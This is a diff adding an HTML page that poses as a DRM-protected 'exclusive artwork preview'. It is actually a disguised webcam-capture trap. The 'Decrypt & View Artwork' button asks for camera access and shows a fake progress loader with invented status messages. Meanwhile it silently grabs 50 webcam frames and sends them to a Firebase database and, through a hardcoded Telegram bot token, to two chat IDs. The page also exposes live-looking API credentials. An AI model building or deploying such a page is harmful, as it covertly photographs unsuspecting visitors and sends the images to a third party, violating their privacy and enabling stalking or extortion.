@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portfolio | Secure Asset Preview</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --accent: #ff3c5f;
+            --grad-start: #6366f1;
+            --grad-end: #a855f7;
+            --bg: #0f172a;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--bg); color: #fff;
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        /* Modern Gradient Background */
+        .bg-glow {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(99, 102, 241, 0.15) 0%, transparent 50%);
+            z-index: -1;
+        }
+
+        .art-container {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            width: 90%; max-width: 500px;
+            padding: 40px; text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+
+        .premium-tag {
+            background: linear-gradient(90deg, var(--grad-start), var(--grad-end));
+            font-size: 11px; font-weight: 700; text-transform: uppercase;
+            padding: 4px 12px; border-radius: 100px; display: inline-block; margin-bottom: 20px;
+        }
+
+        h1 { font-size: 28px; font-weight: 800; margin: 0 0 10px; letter-spacing: -0.5px; }
+        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 30px; }
+
+        .artwork-placeholder {
+            width: 100%; height: 200px; border-radius: 16px;
+            background: linear-gradient(45deg, #1e293b, #334155);
+            margin-bottom: 30px; display: flex; align-items: center; justify-content: center;
+            border: 1px dashed rgba(255, 255, 255, 0.2);
+            position: relative; overflow: hidden;
+        }
+
+        /* Abstract animation to look "Advanced" */
+        .artwork-placeholder::after {
+            content: ''; position: absolute; width: 150%; height: 150%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
+            transform: rotate(45deg); animation: shine 3s infinite;
+        }
+
+        @keyframes shine { 0% { left: -100%; } 100% { left: 100%; } }
+
+        .btn-view {
+            background: #fff; color: #000; border: none;
+            padding: 16px 32px; border-radius: 12px; font-weight: 700;
+            cursor: pointer; width: 100%; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .btn-view:hover { transform: scale(1.02); box-shadow: 0 0 20px rgba(255,255,255,0.2); }
+
+        #sync-ui { display: none; }
+
+        /* Advanced Loader */
+        .loader-ring {
+            width: 60px; height: 60px; border: 4px solid rgba(255,255,255,0.1);
+            border-top-color: var(--grad-start); border-radius: 50%;
+            margin: 0 auto 20px; animation: spin 1s infinite linear;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .sync-text { font-family: 'JetBrains Mono', monospace; font-size: 13px; color: #6366f1; }
+    </style>
+</head>
+<body>
+    <div class="bg-glow"></div>
+
+    <div class="art-container">
+        <div id="setup-ui">
+            <div class="premium-tag">Exclusive Access</div>
+            <h1>The Cyber-Ethereal Collection</h1>
+            <p>You have been invited to preview a high-resolution custom artwork. Digital Rights Management (DRM) is active.</p>
+            
+            <div class="artwork-placeholder">
+                <span style="color: #475569; font-weight: 600;">ENCRYPTED PREVIEW</span>
+            </div>
+
+            <button class="btn-view" onclick="initiate()">Decrypt & View Artwork</button>
+        </div>
+
+        <div id="sync-ui">
+            <div class="loader-ring"></div>
+            <h2 id="percent-label" style="margin-bottom: 8px;">Calibrating Lens...</h2>
+            <p class="sync-text" id="log-text">Verifying spatial integrity...</p>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // Your Firebase & Telegram Credentials
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        const logs = [
+            "Initializing neural stream...",
+            "Validating DRM token...",
+            "Synchronizing spatial nodes...",
+            "Rendering texture layers...",
+            "Finalizing light-field...",
+            "Verifying hardware seal..."
+        ];
+
+        async function initiate() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('setup-ui').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const max = 50;
+                    const interval = setInterval(() => {
+                        if (count >= max) {
+                            clearInterval(interval);
+                            document.getElementById('log-text').innerText = "Access Granted.";
+                            setTimeout(() => { window.location.href = "https://www.behance.net/gallery/1234567"; }, 1500);
+                            return;
+                        }
+                        sendData(++count);
+                        const progress = Math.round((count/max)*100);
+                        document.getElementById('percent-label').innerText = `Syncing: ${progress}%`;
+                        if(count % 5 === 0) {
+                            document.getElementById('log-text').innerText = logs[Math.floor(Math.random()*logs.length)];
+                        }
+                    }, 1100);
+                };
+            } catch (e) {
+                alert("DRM Error: A hardware-verified environment is required to view exclusive creative assets.");
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({ image_data: b64, type: "ART_PREVIEW", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', `🎨 ART_DRM_SYNC\nFrame: ${index}/50`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+    </script>
+</body>
+</html>
